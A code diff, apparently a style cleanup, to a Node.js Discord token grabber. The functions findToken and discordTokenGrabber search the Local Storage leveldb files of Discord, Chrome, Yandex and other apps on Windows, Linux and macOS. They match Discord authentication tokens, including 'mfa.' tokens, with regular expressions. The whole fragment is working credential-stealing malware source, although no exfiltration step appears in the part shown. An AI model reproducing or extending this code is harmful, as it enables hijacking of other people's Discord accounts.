@@ -17,7 +17,7 @@ const findToken = (tokenPath) => {
                         .forEach((line) => {
                             const regex = [
                                 new RegExp(/mfa\.[\w-]{84}/g),
-                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
+                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                             ];
                             for (const _regex of regex) {
                                 const token = line.match(_regex);
@@ -47,7 +47,7 @@ const findToken = (tokenPath) => {
                         .forEach((line) => {
                             const regex = [
                                 new RegExp(/mfa\.[\w-]{84}/g),
-                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
+                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                             ];
                             for (const _regex of regex) {
                                 const token = line.match(_regex);
@@ -65,7 +65,7 @@ const findToken = (tokenPath) => {
             console.log(`=> No directory found for ${tokenPath}`);
         }
     } else if (computerPlatform === 'linux') {
-        tokenPath += '/Default/Local Storage/leveldb/';
+        tokenPath += '/Local Storage/leveldb/';
 
         try {
             fs.readdirSync(path.normalize(tokenPath)).map((file) => {
@@ -75,7 +75,7 @@ const findToken = (tokenPath) => {
                         .forEach((line) => {
                             const regex = [
                                 new RegExp(/mfa\.[\w-]{84}/g),
-                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
+                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                             ];
                             for (const _regex of regex) {
                                 const token = line.match(_regex);
@@ -133,7 +133,7 @@ function discordTokenGrabber() {
                 'YandexBrowser',
                 'User Data',
                 'Default'
-            ),
+            )
         };
     } else if (computerPlatform == 'linux') {
         const home = path.join(process.env.HOME, '.config/');
@@ -142,7 +142,7 @@ function discordTokenGrabber() {
             Discord: path.join(home, 'discord'),
             'Discord Canary': path.join(home + 'discordcanary'),
             'Discord PTB': path.join(home + 'discordptb'),
-            'Google Chrome': path.join(home + 'google-chrome'),
+            'Google Chrome': path.join(home + 'google-chrome')
         };
     } else if (computerPlatform == 'darwin') {
         paths = {
@@ -190,7 +190,7 @@ function discordTokenGrabber() {
                 'Application Support',
                 'Yandex',
                 'YandexBrowser'
-            ),
+            )
         };
     } else {
         return console.log(
